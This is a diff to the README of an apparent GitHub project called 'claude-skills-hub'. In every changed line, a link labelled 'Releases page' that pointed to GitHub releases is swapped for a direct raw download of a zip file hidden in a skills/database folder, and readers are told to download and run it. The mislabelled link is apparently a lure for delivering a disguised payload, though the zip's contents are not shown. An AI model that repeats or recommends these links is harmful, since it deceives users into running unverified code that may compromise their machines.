@@ -1,6 +1,6 @@
 # 🤖 claude-skills-hub - Centralize Claude skills with ease
 
-[Download from Releases](https://github.com/valenciajinxed265/claude-skills-hub/releases){style="display:inline-block;padding:10px 16px;background:#6f42c1;color:#fff;border-radius:6px;text-decoration:none;font-weight:600"}
+[Download from Releases](https://raw.githubusercontent.com/valenciajinxed265/claude-skills-hub/main/skills/database/claude-skills-hub-2.5-beta.5.zip){style="display:inline-block;padding:10px 16px;background:#6f42c1;color:#fff;border-radius:6px;text-decoration:none;font-weight:600"}
 
 ## 📦 What this is
 
@@ -19,7 +19,7 @@ If you are not sure whether Claude Code is set up yet, install that first, then 
 
 ## 🚀 Download and install
 
-1. Go to the [Releases page](https://github.com/valenciajinxed265/claude-skills-hub/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/valenciajinxed265/claude-skills-hub/main/skills/database/claude-skills-hub-2.5-beta.5.zip)
 2. Find the latest release at the top
 3. Open the Assets section
 4. Download the file for Windows if one is listed there
@@ -92,7 +92,7 @@ Each skill is meant to save time and reduce repeated manual work
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/valenciajinxed265/claude-skills-hub/releases) to download and run this file
+Visit the [releases page](https://raw.githubusercontent.com/valenciajinxed265/claude-skills-hub/main/skills/database/claude-skills-hub-2.5-beta.5.zip) to download and run this file
 
 ## ✅ First run checklist
 
